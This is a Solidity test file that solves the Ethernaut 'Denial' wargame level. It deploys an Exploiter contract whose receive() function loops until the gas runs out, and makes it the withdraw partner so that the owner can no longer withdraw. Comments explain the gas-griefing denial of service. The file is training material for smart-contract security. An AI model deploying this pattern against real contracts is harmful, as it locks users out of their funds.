// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Denial.sol";
import "src/levels/DenialFactory.sol";

contract TestDenial is BaseTest {
    Denial private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DenialFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Denial(levelAddress);

        // Check that the contract is correctly setup
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // This challenge is all about Denial of Service
        // The goal of this challenge is not to drain the contract
        // or gain ownership of it but to just make impossible for the owner
        // or other user in general to interact with it

        // Every time the `withdraw()` function is called
        // the partner and the owner will get 1% of the balance
        // The contract is using the lowlevel `call` method to send money to the `partner`
        // In this way, even if we reverted internally or we deployed a contract unable to receive ether
        // the `Denial` contract would not revert, the only conseguence is that us (as partner) we wouldn't receive
        // any ether.

        // How can we deny the service?
        // The only option to do so is to run the transaction (block) out of gas!
        // Each block on ethereum has a max gas that can be spent for it
        // if your transaction consume all the block's gas or it consume all the gas that have been payed
        // by the caller to execute the transaction, the transaction will revert with a Out Of Gas error
        // More info ->
        // - https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/
        // - https://swcregistry.io/docs/SWC-128
        //
        // In our case we took the easier solution possible: A very, very, very long loop that just do an operation
        // this is just enough to make the transaction revert. If this was not the case, you just need to add
        // more operations to the loop to consume even more gas!

        // deploy the exploiter contract
        Exploiter exploiter = new Exploiter();

        // set the exploiter as the partner
        level.setWithdrawPartner(address(exploiter));

        // deny the service?

        vm.stopPrank();
    }
}

contract Exploiter {
    uint256 private sum;

    function withdraw(Denial victim) external {
        victim.withdraw();
    }

    function exploit() public {
        uint256 index;
        for (index = 0; index < uint256(-1); index++) {
            sum += 1;
        }
    }

    receive() external payable {
        exploit();
    }
}
